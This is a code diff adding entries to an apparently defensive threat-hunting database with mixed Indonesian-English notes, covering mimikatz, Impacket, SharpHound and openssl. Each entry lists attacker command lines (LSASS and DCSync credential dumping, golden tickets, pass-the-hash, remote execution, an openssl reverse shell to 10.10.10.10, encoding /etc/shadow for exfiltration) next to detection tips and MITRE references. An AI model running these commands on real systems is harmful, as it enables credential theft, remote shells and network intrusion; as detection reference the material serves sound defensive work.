@@ -2645,6 +2645,101 @@ const DB = [
     detect:"Alert regedit.exe /s dari non-admin atau unexpected parent process. Monitor .reg imports dari temp directories.",
     ref:["https://attack.mitre.org/techniques/T1112/"] },
 
+  // ┌──────────────────────────────────────────────┐
+  // │       OFFENSIVE TOOLS — CREDENTIAL / AD      │
+  // └──────────────────────────────────────────────┘
+  { n:"mimikatz", c:"offensive", os:"win", p:"C:\\Temp\\mimikatz.exe (dropped) / mimi.exe / m64.exe",
+    d:"Windows credential dumping and manipulation tool", r:"CRITICAL",
+    m:["T1003.001","T1558.003","T1550.002"], mn:["LSASS Memory","Kerberoasting","Pass the Hash"], t:["Credential Access"],
+    tldr:"The credential dumping tool — sekali attacker punya SYSTEM dan exec mimikatz, assume ALL credentials on that host are compromised. sekurang-kurangnya dapet NTLM hash semua recently logged-in users, plus bisa Kerberos ticket manipulation, pass-the-hash, golden ticket. Binary sering di-rename. Behavioral detection > hash detection.",
+    chain:{ stage:"Credential Access", flows:["SYSTEM shell → mimikatz privilege::debug + sekurlsa::logonpasswords → plaintext passwords/hashes → lateral movement","mimikatz lsadump::lsa /patch → all local account hashes","mimikatz kerberos::golden → golden ticket → persistence cross-reboot"] },
+    abuse:"Dump LSASS memory untuk credentials, Kerberos ticket manipulation, golden/silver ticket, pass-the-hash/pass-the-ticket.",
+    red:{
+      desc:"Full credential extraction dari memory dan AD — plaintext passwords, NTLM hashes, Kerberos tickets.",
+      cmds:[
+        {c:"mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", n:"dump semua credentials dari LSASS — plaintext passwords kalau WDigest enabled, NTLM hashes selalu"},
+        {c:"mimikatz.exe \"privilege::debug\" \"sekurlsa::wdigest\" exit", n:"extract WDigest credentials — plaintext jika WDigest enabled (Win7/2008 default)"},
+        {c:"mimikatz.exe \"lsadump::sam\" exit", n:"dump local SAM hashes — require SYSTEM, offline hash dump"},
+        {c:"mimikatz.exe \"lsadump::lsa /patch\" exit", n:"dump LSA secrets + local account hashes via memory patch"},
+        {c:"mimikatz.exe \"lsadump::dcsync /user:krbtgt /domain:corp.local\" exit", n:"DCSync — replicate krbtgt hash tanpa login ke DC langsung (perlu DA privs)"},
+        {c:"mimikatz.exe \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /id:500\" \"kerberos::ptt\" exit", n:"Golden Ticket — forge TGT dengan krbtgt hash, persist access even after password reset"},
+        {c:"mimikatz.exe \"sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:cmd.exe\"", n:"Pass-the-Hash — spawn CMD sebagai user lain menggunakan NTLM hash"},
+      ]
+    },
+    legit:"NONE production. Only authorized pentest.",
+    tips:["Behavioral: privilege::debug = SeDebugPrivilege request ke LSASS (Event 4656/4663)","Cek LSASS access dari unusual process (Event 10 Sysmon)","Cek renamed binary — behavior sama meski nama beda","Cek DCSync: Event 4662 dari non-DC machine dengan replication rights","Protect LSASS: PPL (Protected Process Light), Credential Guard","Monitor sekurlsa + lsadump + kerberos keywords di cmdline","ALWAYS INCIDENT jika ditemukan"],
+    detect:"Sysmon Event 10 (LSASS access dari non-lsass.exe). Event 4662 replication dari non-DC. Event 4673 SeDebugPrivilege. Behavior-based detection >>> hash-based (binary sering di-rename/repack). YARA rules untuk mimikatz string patterns.",
+    ref:["https://attack.mitre.org/techniques/T1003/001/","https://attack.mitre.org/techniques/T1558/003/"] },
+
+  { n:"impacket", c:"offensive", os:"linux", p:"/usr/bin/impacket-* | /usr/local/bin/*.py",
+    d:"Python network protocol toolkit (Impacket suite)", r:"CRITICAL",
+    m:["T1003.002","T1003.003","T1021.002","T1021.006","T1550.002"], mn:["SAM Dump","NTDS Dump","SMB Exec","WinRM","Pass the Hash"], t:["Credential Access","Lateral Movement"],
+    tldr:"Python toolkit yang kasih attacker capabilities setara full Windows OS dari Linux — remote credential dump, remote exec, pass-the-hash, Kerberos manipulation, semua tanpa deploy tool ke target. secretsdump.py adalah CRITICAL: bisa dump SAM/LSA/NTDS dari remote host hanya dengan credentials atau hash. No endpoint footprint.",
+    chain:{ stage:"Credential Access / Lateral Movement", flows:["secretsdump.py → remote SAM/NTDS dump → all hashes","psexec.py domain/admin:pass@target → SYSTEM shell","secretsdump.py → hashes → pass-the-hash → pivot","GetUserSPNs.py → kerberoast dari Linux → hashcat"] },
+    abuse:"Remote credential dump, remote code execution, pass-the-hash, Kerberos attacks — semua dari Linux attacker machine.",
+    red:{
+      desc:"Full AD attack toolkit dari Linux — remote credential theft dan lateral movement.",
+      cmds:[
+        {c:"impacket-secretsdump domain/admin:password@192.168.1.10", n:"remote dump SAM + LSA secrets + NTDS (jika DC) — NTLM hashes semua accounts"},
+        {c:"impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL", n:"offline extract dari NTDS.dit dump — decrypt semua domain hashes"},
+        {c:"impacket-psexec domain/admin:password@192.168.1.10", n:"SYSTEM shell via SMB service deployment — classic lateral movement"},
+        {c:"impacket-wmiexec domain/admin:password@192.168.1.10 'cmd /c whoami'", n:"remote exec via WMI — lebih stealthy dari psexec (no service create)"},
+        {c:"impacket-smbexec domain/admin:password@192.168.1.10", n:"exec via SMB share — alternative psexec method"},
+        {c:"impacket-GetUserSPNs domain/user:password -dc-ip 192.168.1.5 -request", n:"Kerberoast dari Linux — request TGS tickets untuk semua SPNs"},
+        {c:"impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 192.168.1.5", n:"AS-REP Roast dari Linux — identify accounts without pre-auth"},
+        {c:"impacket-lookupsid domain/user:password@192.168.1.10", n:"enumerate domain SIDs — user/group discovery via RPC"},
+      ]
+    },
+    legit:"NONE production. Only authorized pentest.",
+    tips:["Detect dari target: SMB service create (Event 7045) = psexec","Detect dari target: WMI process create dari remote IP (Event 4688)","Network: multiple SMB auth attempts dari Linux host = impacket","Alert NTDS.dit copy + secretsdump offline pattern","Monitor Event 4662 DS replication rights di DC","ALWAYS INCIDENT jika traffic pattern dari non-Windows host ke DC port 445/389/88"],
+    detect:"Alert SMB service creation dari remote (Event 7045). Alert DS replication Event 4662 dari non-DC. Network: SMB+WMI+RPC from Linux source IP ke DC = high confidence. Sigma: win_impacket_lateralmovement.yml",
+    ref:["https://attack.mitre.org/techniques/T1003/002/","https://attack.mitre.org/techniques/T1021/002/"] },
+
+  { n:"SharpHound", c:"offensive", os:"win", p:"C:\\Temp\\SharpHound.exe | SharpHound.ps1",
+    d:"BloodHound Active Directory ingestor", r:"CRITICAL",
+    m:["T1087.002","T1069.002","T1482"], mn:["Domain Account Discovery","Domain Group Discovery","Domain Trust Discovery"], t:["Discovery"],
+    tldr:"BloodHound data collector — berjalan di victim machine dan collect SEMUA AD relationships: users, groups, trusts, ACLs, delegation, sessions. Output-nya kasih attacker attack path graph lengkap dari mana aja ke Domain Admin. Single run bisa collect ribuan objects. Extremely noisy di network tapi banyak env yang miss karena traffic tampak legit (LDAP/SMB).",
+    chain:{ stage:"Discovery / Privilege Escalation Planning", flows:["SharpHound collect → import ke BloodHound GUI → shortest path ke DA → execute attack path"] },
+    abuse:"Collect seluruh AD attack surface data — users, groups, ACLs, sessions, trusts untuk attack path planning.",
+    red:{
+      desc:"AD attack graph collection — map seluruh privilege escalation dan lateral movement paths.",
+      cmds:[
+        {c:"SharpHound.exe -c All", n:"collect semua data (users, groups, sessions, trusts, ACLs) — most comprehensive"},
+        {c:"SharpHound.exe -c DCOnly", n:"collect hanya dari DC via LDAP — lebih quiet, tidak perlu kontak tiap host"},
+        {c:"SharpHound.exe -c All --stealth", n:"stealth mode — skip session collection (yang paling noisy)"},
+        {c:"SharpHound.exe -c All --outputdirectory C:\\Temp\\ --zipfilename loot.zip", n:"output ke zip — ready untuk exfil"},
+        {c:"Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Temp\\", n:"PowerShell version — dari SharpHound.ps1"},
+        {c:"bloodhound-python -u user -p pass -d corp.local -ns 192.168.1.5 -c All", n:"Python version (Linux) — sama hasilnya tanpa deploy ke Windows"},
+      ]
+    },
+    legit:"NONE production. Only authorized AD assessment.",
+    tips:["Alert SharpHound binary presence — hash-based detection","Detect via LDAP query volume spike ke DC dalam waktu singkat","Event 1644 (LDAP diagnostics) — mass LDAP queries dari single source","Network: volume LDAP+SMB traffic dari single endpoint ke seluruh domain dalam menit","Alert .zip file creation berisi JSON files (BloodHound format)","Cek SMB sessions ke banyak host dalam waktu singkat (session collection)"],
+    detect:"Alert SharpHound binary (hash + name). Monitor LDAP query spike dari single host ke DC. Detect mass SMB session enum. Sigma: win_hacktool_sharphound_execution.yml",
+    ref:["https://attack.mitre.org/techniques/T1087/002/","https://attack.mitre.org/techniques/T1482/"] },
+
+  // ┌──────────────────────────────────────────────┐
+  // │       LINUX — NETWORK / SHELL TOOLS          │
+  // └──────────────────────────────────────────────┘
+  { n:"openssl", c:"lolbin", os:"linux", p:"/usr/bin/openssl",
+    d:"OpenSSL cryptography toolkit", r:"MEDIUM",
+    m:["T1105","T1059.004","T1132"], mn:["Ingress Tool Transfer","Unix Shell","Data Encoding"], t:["Command and Control","Defense Evasion"],
+    tldr:"OpenSSL bisa lebih dari sekedar crypto library — bisa serve sebagai reverse shell dengan enkripsi SSL (sulit di-inspect), encode/decode payloads, transfer files. Reverse shell via openssl jarang ter-detect karena traffic terenkripsi TLS dan port bisa 443. Legitimate use sangat tinggi tapi pattern tertentu distinctly suspicious.",
+    abuse:"SSL-encrypted reverse shell (bypass IDS/proxy), base64 encode/decode payloads, encrypted file transfer.",
+    red:{
+      desc:"SSL-encrypted reverse shell dan payload encoding yang bypass cleartext inspection.",
+      cmds:[
+        {c:"openssl s_client -quiet -connect 10.10.10.10:443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:443", n:"SSL reverse shell — traffic terenkripsi, tampak seperti HTTPS ke port 443"},
+        {c:"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:443 > /tmp/s", n:"full duplex SSL shell via mkfifo — stable interactive shell"},
+        {c:"openssl enc -aes-256-cbc -in payload.sh -out payload.enc -k password", n:"encrypt payload — bypass file-based AV scan"},
+        {c:"openssl enc -d -aes-256-cbc -in payload.enc -k password | bash", n:"decrypt + exec inline — payload hanya exist terenkripsi di disk"},
+        {c:"openssl base64 -in /etc/shadow -out /tmp/shadow.b64", n:"encode sensitive file ke base64 untuk exfil"},
+      ]
+    },
+    legit:"Extremely common — TLS certs, crypto operations, development. Fokus ke reverse shell patterns.",
+    tips:["Cek s_client ke external IP (especially port 443) + piped ke /bin/sh","Cek enc -d (decrypt) piped ke bash — payload decrypt-and-exec","Cek openssl base64 pada sensitive file paths","Context: standalone openssl = low risk, pipeline ke shell = high risk"],
+    detect:"Alert openssl s_client piped ke shell. Alert openssl enc -d piped ke bash. Monitor outbound openssl connections dari servers ke non-known endpoints.",
+    ref:["https://gtfobins.github.io/gtfobins/openssl/","https://attack.mitre.org/techniques/T1105/"] },
+
 ];
 
 export default DB;
